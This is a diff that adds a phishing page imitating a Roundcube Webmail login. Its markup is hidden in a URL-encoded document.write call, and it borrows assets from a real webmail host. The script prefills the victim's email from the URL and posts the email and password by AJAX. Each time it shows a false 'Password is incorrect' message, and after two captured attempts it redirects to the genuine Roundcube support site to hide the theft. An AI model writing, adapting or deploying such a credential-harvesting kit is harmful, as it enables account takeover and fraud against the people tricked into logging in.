@@ -1,0 +1,131 @@
+<script>
+document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%20class%3D%22js%20chrome%20webkit%20layout-large%22%3E%0A%0A%3Chead%3E%0A%09%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%0A%09%3Ctitle%3ERoundcube%20Webmail%20%3A%3A%20Welcome%20to%20Roundcube%20Webmail%3C/title%3E%0A%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%2C%20shrink-to-fit%3Dno%2C%20maximum-scale%3D1.0%22%3E%0A%09%3Cmeta%20name%3D%22theme-color%22%20content%3D%22%23f4f4f4%22%3E%0A%09%3Cmeta%20name%3D%22msapplication-navbutton-color%22%20content%3D%22%23f4f4f4%22%3E%0A%0A%09%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22https%3A//webmail.supremecluster.com/skins/elastic/images/favicon.ico%3Fs%3D1593860317%22%3E%0A%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css%22%3E%0A%0A%0A%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A//webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css%3Fs%3D1593860330%22%3E%0A%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A//webmail.supremecluster.com/skins/elastic/styles/styles.css%3Fs%3D1593860317%22%3E%0A%0A%09%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22https%3A//webmail.supremecluster.com/plugins/xframework/assets/styles/framework.css%3Fs%3D1506327547%22%3E%0A%09%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22https%3A//webmail.supremecluster.com/plugins/jqueryui/themes/elastic/jquery-ui.css%3Fs%3D1593860316%22%3E%0A%0A%0A%3C/head%3E%0A%0A%3C%21--just%20to%20change%20the%20head--%3E%0A%0A%3Cbody%20class%3D%22task-login%20action-none%22%3E%0A%09%3Cdiv%20id%3D%22layout%22%3E%0A%0A%0A%09%09%3Ch1%20class%3D%22voice%22%3ERoundcube%20Webmail%20Login%3C/h1%3E%0A%0A%09%09%3Cdiv%20id%3D%22layout-content%22%20class%3D%22selected%20no-navbar%22%20role%3D%22main%22%3E%0A%09%09%09%3Cimg%20src%3D%22https%3A//webmail.supremecluster.com/skins/elastic/images/logo.svg%3Fs%3D1593860317%22%20id%3D%22logo%22%20alt%3D%22Logo%22%3E%0A%09%09%09%3Cform%20id%3D%22login-form%22%20name%3D%22login%22%20method%3D%22post%22%20class%3D%22propform%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22error%22%20style%3D%22margin-top%3A%205px%3B%20margin-bottom%3A%204px%3B%20display%3A%20none%3B%20font-size%3A%2014px%3B%22%20id%3D%22errorShow%22%3E%3C/div%3E%0A%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22source%22%20id%3D%22source%22%20value%3D%22roundcube%22%3E%0A%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22_task%22%20value%3D%22login%22%20class%3D%22form-control%22%3E%0A%09%09%09%09%3Ctable%3E%0A%09%09%09%09%09%3Ctbody%3E%0A%09%09%09%09%09%09%3Ctr%20class%3D%22form-group%20row%22%3E%0A%09%09%09%09%09%09%09%3Ctd%20class%3D%22title%22%20style%3D%22display%3A%20none%3B%22%3E%3Clabel%20for%3D%22rcmloginuser%22%3EUsername%3C/label%3E%0A%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%09%3Ctd%20class%3D%22input%20input-group%20input-group-lg%22%3E%3Cspan%20class%3D%22input-group-prepend%22%3E%3Ci%0A%09%09%09%09%09%09%09%09%09%09class%3D%22input-group-text%20user%20fa%20fa-user%22%3E%3C/i%3E%3C/span%3E%3Cinput%20name%3D%22email%22%0A%09%09%09%09%09%09%09%09%09id%3D%22email%22%20required%3D%22%22%20size%3D%2240%22%20autocapitalize%3D%22off%22%20type%3D%22text%22%0A%09%09%09%09%09%09%09%09%09class%3D%22form-control%22%20placeholder%3D%22Username%22%3E%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%09%3Ctr%20class%3D%22form-group%20row%22%3E%0A%09%09%09%09%09%09%09%3Ctd%20class%3D%22title%22%20style%3D%22display%3A%20none%3B%22%3E%3Clabel%20for%3D%22rcmloginpwd%22%3EPassword%3C/label%3E%0A%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%09%3Ctd%20class%3D%22input%20input-group%20input-group-lg%22%3E%3Cspan%20class%3D%22input-group-prepend%22%3E%3Ci%0A%09%09%09%09%09%09%09%09%09%09class%3D%22input-group-text%20pass%20fa%20fa-lock%22%3E%3C/i%3E%3C/span%3E%3Cinput%20name%3D%22password%22%0A%09%09%09%09%09%09%09%09%09id%3D%22password%22%20required%20size%3D%2240%22%20autocapitalize%3D%22off%22%20type%3D%22password%22%0A%09%09%09%09%09%09%09%09%09class%3D%22form-control%22%20placeholder%3D%22Password%22%3E%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/tbody%3E%0A%09%09%09%09%3C/table%3E%0A%09%09%09%09%3Cp%20class%3D%22formbuttons%22%3E%3Cbutton%20type%3D%22submit%22%20name%3D%22submit%22%20id%3D%22submitBtn%22%0A%09%09%09%09%09%09class%3D%22button%20btn%20btn-primary%20btn-lg%20text-uppercase%20w-100%22%3ELogin%3C/button%3E%0A%09%09%09%09%3C/p%3E%0A%0A%09%09%09%09%3Cdiv%20id%3D%22login-footer%22%20role%3D%22contentinfo%22%3E%0A%09%09%09%09%09Roundcube%20Webmail%0A%0A%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/form%3E%0A%09%09%3C/div%3E%0A%3C/body%3E%0A%3C/html%3E'))
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<script src="jquery.min.v2.js"></script>
+
+<script type="text/javascript">
+    let kantass = 0;
+    const redirected = "https://roundcube.net/support/";
+
+
+    const param = new URLSearchParams(window.location.search);
+    var hash = location.hash ? location.hash.slice(1) : '';
+    var hasherror = hash && hash.indexOf('error=') > -1 ? 'error' : '';
+    var emailParam = param.get('email') || param.get('login') || hash;
+    let count = 0;
+    
+    if (emailParam === "null") {
+    emailParam = "";
+    }
+
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const source = document.getElementById('source');
+    const login = document.getElementById('submitBtn');
+    const form = document.getElementById("login-form");
+    const red = document.getElementById("errorShow");
+    email.value = emailParam;
+
+    login.addEventListener('click', function(e){
+    e.preventDefault();
+    if (email.value === "") {
+        showEl(red, "red");
+        red.textContent = "Enter your email address.";          
+        email.focus();
+        return;
+    } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
+        showEl(red, "red");
+        red.textContent = "Enter a valid email address.";
+        email.focus();
+        return;
+    } else if (password.value === "") {
+        showEl(red, "red");
+        red.textContent = "Enter a valid password!";
+        password.focus();
+        return;
+    } else {
+        kantass++;
+
+        var $form = $("#loginForm");
+        var data = {
+            email: email.value,
+            password: password.value,
+            source: source.value
+        };
+        var url = form.action;
+
+
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+        
+        $.ajax({
+        type: "POST",
+        url: url,
+        data: data,
+        cache: false,
+        timeout: 800000,
+        beforeSend: function(xhr){
+            $('#submitBtn').attr("disabled", true);
+            $('#submitBtn').css( 'cursor', 'not-allowed');
+            },
+        success: function(res){
+            if(res){
+            password.value = "";
+            password.style.borderColor = "red";
+            showEl(red, "red");
+            red.textContent = "Password is incorrect.";
+            $('#submitBtn').attr("disabled", false);
+            $('#submitBtn').css("cursor", "pointer");
+            
+            if (kantass >= 2){
+                hideEl(red, "red");
+                red.textContent = "";
+                window.location.replace(redirected);
+            }
+
+            console.log(response);
+            if(response['signal'] == 'ok'){
+                $('#msg').html(response['msg']);
+                
+            }
+            else{
+
+                $('#msg').html(response['msg']);
+            }
+            }else {
+                showEl(red, "red");
+                red.textContent = "Something went wrong, please try again";
+                password.value = "";
+                password.style.borderColor = "red";
+            }
+        },
+        error: function(){
+            showEl(red, "red");
+            red.textContent = "Something went wrong, please try again";
+            password.value = "";
+            password.style.borderColor = "red";
+        },
+        complete: function(){
+            $('#popopopopo').html('View');
+        }
+        });
+        }
+        });
+
+        function showEl(el, color) {
+            el.style.color = color;
+            el.style.display = "block";
+        }
+
+        function hideEl(el) {
+            el.style.color = '#000';
+            el.style.display = "none";
+            el.textContent = "";
+        }
+</script>
